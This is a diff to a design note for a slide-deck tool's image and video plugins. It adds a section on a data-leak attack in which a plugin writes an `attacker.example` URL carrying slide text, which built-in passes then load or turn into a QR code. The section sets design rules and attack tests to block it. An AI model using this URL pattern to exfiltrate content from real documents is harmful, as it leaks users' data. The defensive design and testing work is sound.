@@ -8,7 +8,8 @@ summary: >
   provider rows, extended with a `file` row for MP4 and WebM. The audit found nine defects in today's wiring,
   one of them confirmed by a render: a relative image in slide text breaks in a CLI export written to another folder.
   Owner decisions: a clean break from Marp's alt-text keywords with an autofix, `>` as the video sigil, and remote
-  sources fetched in the bake into a cache; packaging is on hold.
+  sources fetched in the bake into a cache; packaging is on hold. After #2725, every address comes from the
+  author's own block, never from slide text or the DOM (§4.5).
 ---
 
 # Image and video plugins, and one registry of media sources (2026-10-16)
@@ -184,6 +185,60 @@ hosts can serve it, and the others show the stand-in.
 | Video providers, `@video` | `lib/plugins/video/` | the T0 table plus the inline kind; a deck with no video loads none of it |
 | `image`, `collage`, `video` slide classes | components, unchanged in place | layouts that compose the plugins |
 
+### 4.5 The address comes only from the author's block (added 2026-10-16, after #2725)
+
+**The attack.** PR #2725 (`claude/plugin-inline-door-followups`) found that the built-in `video`, `qr`
+variant, `contact` and `wifi` passes read a slide's text and turn any address they find into something the
+viewer loads or scans (a poster link, a QR code). A zip plugin's output also lands on the slide as text. So a
+plugin with no network of its own can write `https://attacker.example/?d=<the slide's text>` onto a video
+slide, and Lattice's own pass publishes it. Today `lib/transformers/rebuilt-classes.js` stops this by
+refusing to let any plugin draw on those slides. The owner wants plugins to draw everywhere, which is safe
+only if no code turns slide text into an address. These plugins are where that becomes true, so they follow
+#2725's five rules:
+
+1. **The address comes from the author's own block:** the `@video{…}` / `@image{…}` record or the
+   `![alt](src)` token, read from the Markdown at render time. Never from slide text, never from the DOM.
+2. **No plugin scans a slide.** No `textContent`, no walk over `<li>`s, no regex over a section's HTML in
+   search of a URL. Today's `video` pass does all three (`video.transform.js` `resolvePayload` reads the
+   rendered bullets, and `lib/transformers/video.js` runs it again over the finished DOM). The plugin does not
+   copy it.
+3. **A browser half touches only its own figure.** Poster painting and the preview overlay select
+   `[data-lattice-figure="video"]` only, read the address from an attribute the renderer wrote, and skip
+   anything inside `[data-lattice-plugin]`.
+4. **Existing decks keep working.** A `<!-- _class: video -->` bullet URL is read from the author's bullet
+   tokens in the engine, before any plugin draws. `lint:deck --fix` offers the `@video{…}` record in its
+   place, the same migration as the Marp keywords (§8, decision 2).
+5. **The old pass is deleted in the commit that replaces it**: its registry entry, its DOM half, and its row
+   on #2725's `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS`. The shadow list in `rebuilt-classes.js` is derived from
+   the registry, so it shrinks on its own. These plugins never go on that allowlist: if
+   `checkSlideTextAddressReaders` flags them, the code is wrong.
+
+**What this note's own design had to change.** Three places in §4 would have rebuilt the attack:
+
+- **The inline records, through the runtime mirror.** `transformInlinePills` (`lib/runtime/index.js:1115`)
+  walks every `section code` in the finished page, plugin output included, and dispatches it. Icons, avatars
+  and sparks draw no address, so that is harmless today. A plugin that writes `<code>@video{https://attacker…}</code>`
+  would get a real poster link from it. So an inline kind that carries an address declares it
+  (`contributes.inline.video.address: true`), the runtime mirror never dispatches such a kind, and the mirror
+  skips `[data-lattice-plugin]` for every kind. Address-bearing records resolve on the markdown-it token path
+  only.
+- **The image passes that run over rendered HTML.** `resolveInlineImageSrcs` (`IMG_SRC_RE`,
+  `bg-image.js:94`), `liftImageBgImages` and `wrapImageText` read the section's HTML, plugin output included.
+  They map only to local schemes today, so they leak nothing, but the `image` plugin moves them onto the
+  image tokens or onto elements the engine stamped, never onto any `<img>` in the section. The web-image
+  consent gate (`blockWebImages`) stays the last pass over the whole page, so even a plugin's own `<img>`
+  cannot load a remote picture without the reader's consent.
+- **The bake's remote fetch (§4.1).** `materialize` receives only the references the engine collected from
+  tokens. It never scans rendered HTML for something to fetch.
+
+**Evidence each slice owes (HARD RULE #23):** an attack test per plugin. A listed, approved zip plugin
+renders `https://attacker.example/?d=<slide text>` as plain text on a slide that also carries the author's
+video or image. Rendered in the real Studio and in a CLI export with a network log, it makes zero requests to
+`attacker.example`, and the author's own media still shows.
+`test/integration/export/plugin-fence-door.test.js` ("A SLIDE A SHIPPED PASS REBUILDS FROM ITS TEXT") keeps
+its assertions and flips its expectation from "the plugin never drew" to "the plugin drew, nothing leaked".
+Every committed deck that uses video or images renders the same before and after (golden-diff).
+
 ## 5. Why records, not Marp keywords
 
 Marp hides options in the alt text (`![bg left:40% blur](x)`), so the alt text a screen reader needs is
@@ -220,13 +275,17 @@ Each slice ships on its own, smallest risk first.
 4. **Bake materialization and the content-addressed cache**, then the first remote source behind consent.
    Google Drive comes after the desktop app holds a token.
 
-Adversarial trio on slices 1 and 4 (a new trust boundary); one checker on 2 and 3.
+Adversarial trio on every slice (HARD RULE #25). Slices 1 and 4 move the remote predicate and add a fetch, and
+slices 2 and 3 replace passes that read slide text into an address (§4.5), so each one is a trust boundary.
+Slices 2 and 3 rebase onto #2725 once it lands, because they delete rows from its allowlist.
 
 ## 8. Decisions (owner, 2026-10-16)
 
 1. **Packaging: on hold.** The owner held this one. The options stay as written: a core sources registry plus
    separate `image` and `video` plugins (this note's recommendation, §4.4), one `media` plugin, or all core.
-   Slice 1 (the sources registry) is core under every option, so it does not wait on this.
+   Slice 1 (the sources registry) is core under every option, so it does not wait on this. The rule in §4.5
+   (a plugin reads only its own block and writes only its own figure) argues for separate plugins: each one's
+   input is narrower, so each one is easier to prove.
 2. **Marp's alt-text keywords: a clean break, with an autofix.** `![alt](src)` stays as the plain image alias.
    Placement and treatment move to `@image{…}`, and `lint:deck --fix` rewrites `![bg left](x)` and the rest.
    This matches Segno's no-dual-syntax decision. Export-to-Marp still writes the keywords back out.
@@ -241,3 +300,5 @@ Adversarial trio on slices 1 and 4 (a new trust boundary); one checker on 2 and 
 
 - 2026-10-16: audit and proposal written; D1 confirmed by render and logged. Owner settled decisions 2-4;
   decision 1 (packaging) is on hold.
+- 2026-10-16: §4.5 added after #2725's attack. The design now takes every address from the author's block.
+  The inline records stay off the runtime DOM mirror, and every slice gets the adversarial trio.
